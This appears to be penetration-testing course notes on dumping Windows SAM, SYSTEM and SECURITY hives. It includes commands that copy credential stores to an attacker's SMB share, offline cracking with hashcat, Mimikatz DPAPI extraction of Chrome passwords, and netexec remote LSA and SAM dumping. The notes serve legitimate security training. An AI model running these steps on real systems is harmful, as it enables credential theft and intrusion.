# Attacking SAM, SYSTEM, and SECURITY

With **local administrative access** to a Windows system, it is possible to **dump the SAM database**, transfer the files to an attacker machine, and **crack the hashes offline**.
The main advantage is being able to continue the attack **without maintaining an active session** on the target host.

---

## Important Registry Hives

Three Windows registry hives are critical for credential dumping:

| Registry Hive   | Description                                                       |
| --------------- | ----------------------------------------------------------------- |
| `HKLM\SAM`      | Contains password hashes for local user accounts                  |
| `HKLM\SYSTEM`   | Contains the system boot key used to encrypt the SAM              |
| `HKLM\SECURITY` | Contains LSA secrets, DCC2 hashes, DPAPI keys, cached credentials |

Without the `SYSTEM` hive, the hashes stored in the SAM **cannot be decrypted**.

---

## Backing Up Registry Hives with `reg.exe`

From a **Command Prompt running as Administrator**:

```cmd
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

Each command should return:

```
The operation completed successfully.
```

---

## Transferring Hive Files to the Attacker Machine

### Creating an SMB Share with Impacket

On the attacker machine:

```bash
sudo python3 smbserver.py -smb2support CompData /home/ltnbob/Documents/
```

* `-smb2support` is required because SMBv1 is disabled by default on modern Windows systems
* `CompData` is the name of the SMB share

---

### Moving the Files from the Windows Target

```cmd
move sam.save \\10.10.15.16\CompData
move system.save \\10.10.15.16\CompData
move security.save \\10.10.15.16\CompData
```

Verification on the attacker machine:

```bash
ls
sam.save  system.save  security.save
```

---

## Dumping Hashes with `secretsdump`

```bash
python3 secretsdump.py \
  -sam sam.save \
  -system system.save \
  -security security.save \
  LOCAL
```

### Example Output

```text
Dumping local SAM hashes (uid:rid:lmhash:nthash)
bob:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
```

Hash format:

```
username : RID : LM hash : NT hash
```

* Modern Windows systems primarily use **NTLM**
* **LM hashes** are only relevant on very old Windows versions

---

## Cracking NTLM Hashes with Hashcat

### Preparing the Hash File

```bash
vim hashestocrack.txt
```

```text
64f12cddaa88057e06a81b54e73b949b
6f8c3f4d3869a10f3b4f0522f537fd33
184ecdda8cf1dd238d438c4aea4d560d
f7eb9c06fafaa23c4bcf22ba6781c1e2
```

---

### Running Hashcat (NTLM Mode)

```bash
hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

* `-m 1000` specifies **NTLM**
* `rockyou.txt` is used as the wordlist

### Example Results

```text
f7eb9c06fafaa23c4bcf22ba6781c1e2:dragon
6f8c3f4d3869a10f3b4f0522f537fd33:iloveme
184ecdda8cf1dd238d438c4aea4d560d:adrian
```

---

## DCC2 (Domain Cached Credentials v2)

DCC2 hashes are stored in `HKLM\SECURITY` on domain-joined systems.

Example:

```text
domain.local/Administrator:$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25
```

Characteristics:

* Based on PBKDF2
* Significantly slower to crack than NTLM
* Cannot be used for Pass-the-Hash attacks

### Hashcat Mode for DCC2

```bash
hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' rockyou.txt
```

Cracking speed is typically **hundreds of times slower** than NTLM, depending on hardware.

---

## DPAPI (Data Protection API)

DPAPI is used by Windows to encrypt sensitive data per user or machine.

Common applications using DPAPI:

* Google Chrome (saved passwords)
* Internet Explorer
* Outlook
* Remote Desktop Connection
* Credential Manager
* VPN and Wi-Fi credentials

### Example with Mimikatz (Chrome)

```text
dpapi::chrome /in:"Login Data" /unprotect
```

Result:

```text
URL      : http://10.10.14.94/
Username : bob
Password : April2025!
```

---

## Remote Dumping of LSA Secrets

With local administrator credentials:

```bash
netexec smb 10.129.42.198 --local-auth -u bob -p password --lsa
```

This can retrieve:

* Service account credentials
* Scheduled task passwords
* DPAPI keys
* NL$KM secrets

---

## Remote SAM Dumping

```bash
netexec smb 10.129.42.198 --local-auth -u bob -p password --sam
```

This allows dumping SAM hashes **without interactive access** to the system.

---

## Conclusion

Offline dumping of the SAM database, combined with hash cracking and DPAPI/LSA secret extraction, is a **core Windows post-exploitation technique**.
It is particularly effective due to **password reuse**, but may be detected or mitigated by modern defensive controls (MITRE ATT&CK).